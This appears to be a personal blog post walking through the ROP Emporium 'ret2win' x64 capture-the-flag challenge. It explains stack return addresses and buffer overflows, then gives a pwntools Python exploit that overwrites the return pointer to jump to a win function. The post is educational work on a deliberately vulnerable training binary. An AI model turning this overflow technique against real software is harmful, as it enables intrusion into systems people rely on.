---
layout: post
permalink: /ROP_emporium/2022-07-13-ROP-x64-Challenge-1
title: ROP x64 Challenge 1
status: in progress
comments: true
date: 2022-07-13
---

## Challenge 1 Ret2win

This challenge introduces the concept of a buffer overflow and controlling the instruction pointer of an executable. An important thing to know is that all the computer does is look at a chunk of binary in memory and then execute what it tells the computer to do. Then it looks at the next chunk of memory and so on and so forth.

However, occasionally the code needs to jump to other parts of code in order to function correctly (think of an if statement or a loop). To do this the computer simply reads an instruction that tells it to jump to a different part of code, say 20 values up/down from where it is now. 

That works great for loops and if statements, but programmers often want to call code from many different parts of the program (think functions). So in the middle of doing A, I want the program to stop, go do B, then come back and finish A. I also want to be able to do that while doing C, D, and F. The problem for the program, is once it finishes B, where does it go back to, A, C, D or F. It has to store that information somewhere and it is stored on the stack, which can be considered the memory of every function. The first thing a function does is store where it should return to on the stack and the last thing a function does is tell the computer to return back to that location.

What we are going to try and do is change that value on the stack so when the program returns to that stored location it returns to where we want it to go.

We see from running the ret2win binary that it will "attempt to fit 56 bytes of user input into 32 bytes of stack buffer!" and after looking at the stack in [[pwndbg]] we are able to see the following layout:

> ./ret2win 
	ret2win by ROP Emporium
	x86_64
	For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
	What could possibly go wrong?
	You there, may I have your input please? And don't worry about null bytes, we're using read()!

All local variables are on the stack and a base pointer (which we don't have to worry about). So assuming there are no other local variables, there is 40 bytes bytes between the read and the return pointer. We can craft a payload like this:
```
        | stack          |
        | -------------- |
8 bytes | start buffer   |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | base pointer   |
8 bytes | return pointer | # where we are going to return to
8 bytes | -------------- |

```
By writing in the first 32+8 bytes of garbage, we are then able to write whatever we want into the return pointer. So all we have to do is look to see what the value should be.
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
...
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
...
pwndbg>
```

Looking at the functions in the binary we see there is one called ret2win or return here to win which seems super promising. Piecing that all together and we get the following exploit.

```python
from pwn import *

io = process('./ret2win')


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

new_IP = p32(0x00400756) # The ret2win pointer

payload = junk + new_bp +  new_IP

# Print the payload for debugging puropses
print("The payload is:")
print(payload)

# wait for debugger to be attached
input("Hit enter to apptempt exploit")

# read the output and send the payload
print(io.clean(0.5).decode("utf-8"))
io.send(junk+new_bp + new_IP)



# Once done debugging, read the output
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))


```

The exploit will print out the pid of the process and then wait in order to attach gdb with `gdb -p $pid` for debugging it live.

